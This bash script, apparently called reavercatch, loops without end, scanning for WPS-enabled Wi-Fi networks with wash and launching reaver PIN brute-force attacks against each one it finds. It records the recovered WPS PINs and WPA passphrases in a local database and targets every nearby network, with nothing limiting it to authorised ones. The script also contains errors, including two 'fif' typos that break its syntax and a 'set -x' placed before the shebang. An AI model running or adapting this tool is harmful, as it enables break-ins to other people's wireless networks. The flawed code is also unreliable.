set -x
#!/bin/bash

trap ctrl_c INT

RED='\033[0;31m'
LBLUE='\033[1;34m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
ORANGE='\033[0;33m'
NC='\033[0m'

f_config="/etc/reaver/reavercatch.conf"
f_db="/etc/reaver/reaver.db"
d_keys="/etc/reaver/keys/"

ctrl_c(){
	echo -en "\033[2K"
	echo -en "\n\r${YELLOW}[*] Keyboard Interrupt${NC}"
	echo -e "\033[K"
	echo -e "\r${LBLUE}[*] Keys captured this session: $keys_count${NC}"
	rm -r /tmp/rc_* &> /dev/null
	tput cnorm
	kill $! &> /dev/null
	exit 0
}

banner(){
	echo -e "${RED}"
	echo " __   __  _______  _______  __   __  _______  _______  _______  _______  __   __ "; sleep 0.2
	echo "|  | |  ||   _   ||       ||  | |  ||       ||   _   ||       ||       ||  | |  |"; sleep 0.2
	echo "|  |_|  ||  |_|  ||  _____||  |_|  ||       ||  |_|  ||_     _||       ||  |_|  |"; sleep 0.2
	echo "|       ||       || |_____ |       ||       ||       |  |   |  |       ||       |"; sleep 0.2
	echo "|       ||       ||_____  ||       ||      _||       |  |   |  |      _||       |"; sleep 0.2
	echo "|   _   ||   _   | _____| ||   _   ||     |_ |   _   |  |   |  |     |_ |   _   |"; sleep 0.2
	echo "|__| |__||__| |__||_______||__| |__||_______||__| |__|  |___|  |_______||__| |__|"; sleep 0.2
	echo -en "\n${NC}"
}

spin(){
		echo -en "/"
		sleep 0.1
		echo -en "\033[1D"
		echo -en "-"
		sleep 0.1
		echo -en "\033[1D"
		echo -en "\\"
		sleep 0.1
		echo -en "\033[1D"
		echo -en "|"
		sleep 0.1
		echo -en "\033[1D"
}

rc_setup(){
	if [ "$EUID" -ne 0 ]
	then
		echo -e "[-] Requires root permission. Exiting!"
		exit 0
	fi
	banner
	echo "[*] Starting reavercatch setup"

    if [ ! -d "/etc/reaver" ]; then
        mkdir /etc/reaver
    fi

	if [ -s $f_config ] || [ -s $f_db ] || [ `ls $d_keys 2>/dev/null` ]
	then
		echo -e "${RED}[!] WARNING! Continuing with setup will rewrite your existing config file, db file, and your keys directory! Take a backup if necessary${NC}"
		read -p "[!] Do you want to proceed? [y/N]: " flag
		flag=${flag:-"n"}
		if [[ ${flag,,} == "n" ]]
		then
			echo "[*] Exiting!"
			exit 0
		fi
	fif

	sudo cp /dev/null $f_config &> /dev/null
	sudo cp /dev/null $f_db &> /dev/null
	rm -r $d_keys &> /dev/null
	mkdir $d_keys &> /dev/null

		echo -e "[*] Using hardcoded interface 'wlan1mon'"
		echo -e "[*] Trying to set the given interface to monitor mode"
    sudo airmon-ng start wlan1
	monitor_interface=$(sudo airmon-ng | grep -oP '(?<=^phy\d+\s+)\w+mon(?=\s+)' | head -n 1)
	if [ -z "$monitor_interface" ]; then
		echo -e "${RED}[!] Failed to get monitor interface name. Exiting!${NC}"
		exit 1
	fi
	echo -e "${GREEN}[+] The adapter is working in monitor mode as $monitor_interface!${NC}"
	echo "interface=$monitor_interface" >> $f_config

	if [[ `pacman -Qi reaver 2>&1` == "not found" ]]
		then
			echo -e "${YELLOW}[!] The following packages are missing. Please ensure that you have installed them properly before starting reavercatch${NC}"
			echo -e "\treaver"
		else
			echo -e "${GREEN}[*] All necessary packages are found installed${NC}"
		fi

		echo -e "[*] Done"
}

rc_help(){
	banner
	echo -e "Start reavercatch:"
	echo -e "\tsudo ./reavercatch"
	echo -e "Arguments:"
	echo -e "\t./reavercatch --setup - Run setup"
	echo -e "\t./reavercatch --help  - Print this help screen\n"
}

rc_run(){
	interface=`grep -i 'interface' $f_config | awk -F'=' '{print $2}'`
	
	if [ "$EUID" -ne 0 ]
	then
		echo -e "[-] Requires root permission. Exiting!"
		exit 0
	elif [ ! -f $f_config ] || [ ! -f $f_db ] || [ ! -d $d_keys ]
	then
		echo -e "[-] Essential file(s) missing. Run with --setup and try again!"
		exit 0
	elif [ ! `grep -i "interface" $f_config | awk -F'=' '{print $2}'` ]
	then
		echo -e "[-] Interface not mentioned in config file. Run with --setup and try again!"
		exit 0
	elif [[ `sudo aireplay-ng --test $interface 2>&1` != *"Injection is working"* ]]
	then
		echo -e "[-] Could not set wireless adapter to monitor mode. Run with --setup and try again!"
		exit 0
	fi

	if [[ `pacman -Qi reaver 2>&1` == "not found" ]]
    then
		echo "${YELLOW}[!] The following packages are missing. Install them and try again!${NC}"
		if [[ `pacman -Qi reaver 2>&1` == "not found" ]]
		then
			echo -e "\treaver"
			exit 0
		fi
	fif

	tput civis
	
	banner

	rm -r /tmp/rc_* &> /dev/null

	echo -en "\033[3B"

	keys_count=0

	while true
	do
		ap_count=0

		echo -en "\033[3A"
		echo -en "\033[2K"
		echo -en "\rStatus: ${YELLOW}Scanning for WPS enabled networks${NC}"
		echo -en "\033[2C"
		while [ true ]; do echo -en "${YELLOW}"; spin; echo -en "${NC}"; done &> /dev/null
		timeout --foreground 30 wash -i "$interface" -C > /tmp/rc_stations.tmp
		echo -en "${NC}"
		kill $! &> /dev/null
		echo -en "\033[1B"
		echo -en "\033[2K"
		echo -en "\033[2B"
		echo -en "\r"

		#echo "[*] Reading stations"
		tail -n +3 /tmp/rc_stations.tmp | awk '{print $1 "," $2 "," $6}' > /tmp/rc_stations.csv

		#echo "[*] Clearing temp files"
		rm /tmp/rc_stations.tmp

		readarray stations < /tmp/rc_stations.csv

		for station in "${stations[@]}"
		do
			bssid=`echo "$station" | awk -F',' '{print $1}' | sed -e 's/^[" 	]*//'`
			channel=`echo "$station" | awk -F',' '{print $2}' | sed -e 's/^[" 	]*//'`
			essid=`echo "$station" | awk -F',' '{print $3}' | sed -e 's/^[" 	]*//'`
			if [[ "`grep -i 'ignore' $f_config | awk -F'=' '{print $2}'`" == *"$essid"* ]] || [[ "`grep "$bssid" $f_db`" ]]
			then
				continue
			fi
			((ap_count++))
			echo -en "\033[2A"
			echo -en "\033[2K"
			echo -en "\rAccess Point: ${YELLOW}$essid${NC}"
			echo -en "\033[2B"
			echo -en "\033[3A"
			echo -en "\033[2K"
			echo -en "\rStatus: ${YELLOW}Starting reaver attack${NC}"
			echo -en "\033[3B"
			echo -en "\r"
			
            reaver -i "$interface" -b "$bssid" -c "$channel" -vv -o "$d_keys/$bssid.log"
			
            if [ $? -eq 0 ]; then
                ((keys_count++))
                pin=$(grep 'WPS PIN' "$d_keys/$bssid.log" | awk '{print $4}')
                wpa_psk=$(grep 'WPA PSK' "$d_keys/$bssid.log" | awk '{print $4}')
                echo "$bssid,$essid,$pin,$wpa_psk" >> $f_db
            fi
		done

		
		if [[ $ap_count == 0 ]]
		then
			echo -en "\033[1A"
			echo -en "\033[2K"
			echo -en "\rLast scan: ${YELLOW}No new WPS networks found${NC}"
			echo -en "\033[1B"
			echo -en "\r"
		else
			echo -en "\033[1A"
			echo -en "\033[2K"
			echo -en "\rLast scan: ${YELLOW}$keys_count new keys captured${NC}"
			echo -en "\033[1B"
			echo -en "\r"
		fi
	done
}

if [[ $1 == "--help" ]]
then
	rc_help
elif [[ $1 == "--setup" ]]
then
	rc_setup
elif [[ $1 == "" ]]
then
	rc_run
else
	rc_help
fi